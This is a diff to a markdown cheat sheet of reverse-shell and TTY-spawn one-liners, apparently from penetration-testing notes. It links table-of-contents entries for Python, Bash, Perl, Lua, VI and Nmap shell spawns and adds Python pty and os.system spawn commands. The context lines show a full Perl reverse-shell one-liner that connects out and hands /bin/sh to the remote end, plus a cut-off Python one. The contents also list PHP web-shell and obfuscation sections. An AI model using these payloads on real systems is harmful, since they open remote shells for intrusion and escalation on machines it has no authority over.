@@ -9,16 +9,16 @@ ____
 * #### [Ruby](#reverse_shell_ruby)
 * #### [Perl](#reverse_shell_perl)
 ### TTY Spawn Shell
-* #### Python spawn shell
-* #### OS system spawn shell
-* #### Bash spawn shell
-* #### Perl spawn shell
-* #### Python spawn shell 
-* #### Lua spawn shell 
-* #### IRB spawn shell 
-* #### VI spawn shell 
-* #### VI(2) spawn shell 
-* #### Nmap spawn shell 
+* #### [Python spawn shell](#python_spawn_shell)
+* #### [OS system spawn shell](#os_system_spawn_shell)
+* #### [Bash spawn shell](#bash_spawn_shell)
+* #### [Perl spawn shell](#perl_spawn_shell)
+* #### [Python spawn shell](#python_spawn_shell)
+* #### [Lua spawn shell](#lua_spawn_shell)
+* #### [IRB spawn shell](#irb_spawn_shell)
+* #### [VI spawn shell](#vi_spawn_shell)
+* #### [VI(2) spawn shell](#vi2_spawn_shell)
+* #### [Nmap spawn shell](#nmap_spawn_shell)
 ### PHP Reverse Shell
 * #### RCE
 * #### Obfuscate PHP Web Shell
@@ -90,3 +90,9 @@ python -c 'import sys,socket,os,pty;s=socket.socket()
 ###### perl -e 'use Socket;$i="$ENV{127.0.0.1}";$p=$ENV{1234};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 
 ____
+
+### TTY Spawn Shell > <a name="python_spawn_shell"></a>Python spawn shell
+###### python -c 'import pty; pty.spawn("/bin/sh")'
+
+### TTY Spawn Shell > <a name="os_system_spawn_shell"></a>OS system spawn shell
+###### echo os.system("/bin/bash")
